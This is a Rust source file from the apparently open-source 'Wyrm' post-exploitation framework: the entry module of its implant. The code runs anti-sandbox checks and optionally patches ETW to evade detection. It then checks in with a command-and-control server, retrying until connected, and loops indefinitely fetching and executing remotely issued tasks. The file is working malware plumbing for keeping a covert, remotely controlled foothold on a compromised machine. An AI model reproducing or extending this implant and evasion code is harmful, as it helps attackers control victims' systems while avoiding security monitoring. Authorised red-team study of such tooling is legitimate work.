//! Entry module for kicking off the implant, whether from a DLL or an exe.

use std::{sync::atomic::AtomicBool, thread::sleep, time::Duration};

#[cfg(debug_assertions)]
use shared::pretty_print::print_failed;
use shared::pretty_print::print_info;

use crate::{
    anti_sandbox::anti_sandbox,
    comms::configuration_connection,
    wyrm::{Wyrm, calculate_sleep_seconds},
};

/// Determines whether the agent is built as a service, or not
pub static IS_IMPLANT_SVC: AtomicBool = AtomicBool::new(false);
/// Is the application currently running - this will be set to false when the exit command is given.
pub static APPLICATION_RUNNING: AtomicBool = AtomicBool::new(true);

/// Literally just the entry function into the payload allowing flexibility to call from either
/// an exe, or dll
pub fn start_wyrm() {
    #[cfg(debug_assertions)]
    print_info("Starting Wyrm post exploitation framework in debug mode..");

    // Do the anti-sandbox, etw patching, etc.. before we jump into the implant loop.
    on_start_evasion();

    let mut implant = Wyrm::new();
    first_check_in(&mut implant);

    loop {
        implant.get_tasks_http();
        implant.dispatch_tasks();

        sleep(Duration::from_secs(calculate_sleep_seconds(&implant)));
    }
}

fn on_start_evasion() {
    // First run the anti-sandbox checks, we dont necessarily want to do other
    // evasion strategies before this point, if they were enabled in the build
    // profile.
    anti_sandbox();

    #[cfg(feature = "patch_etw")]
    {
        use crate::utils::etw::patch_etw_current_process;

        #[cfg(debug_assertions)]
        print_info("Patching etw..");

        let _ = patch_etw_current_process();
    }

    #[cfg(debug_assertions)]
    print_info("All on start evasion checks completed");
}

pub fn first_check_in(implant: &mut Wyrm) {
    let mut attempt: u32 = 0;

    loop {
        // Try get the response from the C2; if we receive an error then keep looping over this
        // first configuration until we get a successful response.
        // Ultimately, this may hinder the implant if it cannot get a connection, but at the same time
        // it would be useless given it acts as a post exploitation framework if we cannot control it.
        let tasks = match configuration_connection(implant) {
            Ok(r) => r,
            Err(e) => {
                #[cfg(debug_assertions)]
                print_failed(format!("Failed to make first connection to C2. {e}"));

                attempt += 1;

                if attempt == implant.first_connection_retries.num_retries {
                    #[cfg(debug_assertions)]
                    print_failed("Max first connection retries reached. Exiting.");
                    std::process::exit(0);
                }

                std::thread::sleep(Duration::from_secs(
                    implant.first_connection_retries.failed_first_conn_sleep,
                ));
                continue;
            }
        };

        //
        // Now that we have the tasks, we can dispatch them to set anything that is required locally.
        //

        if tasks.is_empty() {
            #[cfg(debug_assertions)]
            print_info("Tasks were empty on implant first run");
            return;
        }

        for task in tasks {
            implant.tasks.push_back(task);
        }

        #[cfg(debug_assertions)]
        print_info("Dispatching first run tasks.");

        implant.dispatch_tasks();

        break;
    }
}
